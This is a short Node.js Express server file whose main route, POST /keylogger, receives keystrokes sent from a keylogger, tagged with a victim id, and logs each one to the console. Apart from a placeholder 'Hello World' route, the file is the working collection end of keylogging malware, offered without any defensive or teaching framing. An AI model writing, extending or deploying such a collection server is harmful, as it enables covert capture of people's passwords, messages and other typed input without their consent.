const express = require('express')
const app = express()
app.use(express.json())
const port = 3000

app.get('/', (req, res) => {
  res.send('Hello World!')
})

/**
 * POST endpoint for receiving and logging keystrokes from keylogger.
 * 
 * Accepts JSON body of POST request in format: `{id, keystroke}`
 */
app.post("/keylogger", (req, res)=>{
    console.log(`${req.body.id}: ${req.body.keystroke}`)
    res.status(200).send({ok:true})

})

app.listen(port, () => {
  console.log(`Simple REST API listening on port ${port}`)
})